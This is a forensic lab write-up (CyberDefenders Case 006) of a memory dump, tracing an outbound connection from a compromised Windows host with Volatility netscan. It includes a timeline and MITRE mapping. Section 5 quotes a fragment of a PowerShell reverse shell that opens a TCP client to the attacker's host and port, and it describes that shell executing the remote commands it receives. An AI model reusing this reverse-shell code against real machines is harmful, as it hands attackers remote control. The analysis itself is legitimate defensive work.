# Network Analysis

**Case ID:** 006  
**Time Standard:** UTC  
**Source Platform:** CyberDefenders CyberRange  

## 1. Objective

Identify malicious network connections associated with the compromised host and validate command-and-control (C2) activity.

## 2. Known Indicators (Defanged)

| Type | Indicator |
|------|----------|
| Remote C2 | 10[.]0[.]128[.]2:4337 |
| Suspected File | C:\Windows\System32\svchost.bat |
| Execution Pivot | powershell.exe (PID 5104) |

## 3. Active Network Connections

**Command used**:

`python vol.py -f memory.dmp --profile=Win10x64_17763 -g 0xf8034da8a4d8 netscan`

**Filtered for C2 IP**:

`python vol.py -f memory.dmp --profile=Win10x64_17763 netscan | Select-String "10.0.128.2"`

**Result**
| Local Address | Remote Address | State |
| :--- | :--- | :--- |
| 10.0.128.0:63944 | 10.0.128.2:4337 | ESTABLISHED |

## 4. Source Port Identification
- Local source port: 63944
- Protocol: TCPv4
- Connection state: ESTABLISHED

**Interpretation**:

The compromised system initiated an outbound TCP connection from ephemeral port 63944 to the attacker-controlled endpoint.

## 5. C2 Script Behavior
**Extracted from strings_out.txt**:

`$client = New-Object System.Net.Sockets.TCPClient('10.0.128.2',4337);`

**Defanged**:

`10[.]0[.]128[.]2:4337`

**Behavioral Analysis**

The script:
- Creates a TCP client connection
- Reads incoming commands from remote host
- Executes commands via iex
- Sends output back over the same stream

This behavior is consistent with a basic reverse-shell implementation.

## 6. Timeline Correlation
| Time (UTC) | Event |
| :--- | :--- |
| 13:23:40 | PowerShell process started |
| 13:25:04 | `svchost.bat` created |
| ~13:25+ | C2 connection established |
| 13:29:33 | Memory capture time (Session Active) |

## 7. MITRE ATT&CK Mapping
Technique	ID	Evidence
Application Layer Protocol	T1071	TCP-based C2
Command and Scripting Interpreter	T1059	PowerShell reverse shell
Ingress Tool Transfer	T1105	C2 command execution over TCP

## 8. Network-Level Conclusion
**C2 Communication**: Confirmed
**Protocol**: TCP
**Connection State at Capture**: ESTABLISHED
**Credential Theft Preceded C2**: Yes

The compromised host maintained an active outbound command channel to an attacker-controlled endpoint.
